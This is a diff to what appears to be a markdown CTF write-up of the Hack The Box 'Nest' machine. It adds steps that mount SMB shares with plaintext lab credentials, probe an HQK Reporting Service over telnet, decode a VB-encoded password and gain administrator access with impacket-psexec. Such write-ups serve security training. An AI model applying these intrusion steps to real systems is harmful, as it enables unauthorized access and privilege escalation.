@@ -63,9 +63,47 @@ https://dotnetfiddle.net/LdhDaa
 
 ![nest4](https://user-images.githubusercontent.com/123066149/219978395-27c5720e-def1-46ee-8006-cfeb6154147d.PNG)
 
-
 # ${{\color{purple}Exploitation}}\ $ 
 
+### I have created directories and I mounted the share in the files to make a better enumeration :
+
+mkdir C.Smith
+
+mkdir L.Frost
+
+mkdir R.Thompson
+
+mkdir TempUser 
+
+mount -t cifs -o 'username=L.Frost,password=welcom2019' //10.10.10.178/Users /mnt/L.Frost
+
+mount -t cifs //10.10.10.178/Data /mnt/tmpuser -o "username=TempUser,password=welcome2019"
+
+find .  
+
+### OR to exploit the structure
+
+tree -f
+
 # ${{\color{purple}Privilege Escalation}}\ $
+
+``telnet 10.10.10.178 4386``
+
+HQK Reporting Service V1.2
+
+![nest9](https://user-images.githubusercontent.com/123066149/219978750-0df318a5-091d-4117-b511-1929e1a5637e.PNG)
+
+![nest10](https://user-images.githubusercontent.com/123066149/219978754-492ceb49-2465-4b0b-a73d-5b066e660b46.PNG)
+
+![nest11](https://user-images.githubusercontent.com/123066149/219978757-1e3f2a5e-e0a6-4f1f-9932-31d16f3defb1.PNG)
+
+### The password was in vb format i used this site to decode it :
+
+https://dotnetfiddle.net/LdhDaa
+
+``/usr/bin/impacket-psexec administrator@10.10.10.178``
+
+![nest5](https://user-images.githubusercontent.com/123066149/219978802-4d6431df-f61c-4545-b87e-256f69e4c39b.PNG)
+
 
 # ${{\color{purple}Points of Improvement}}\ $
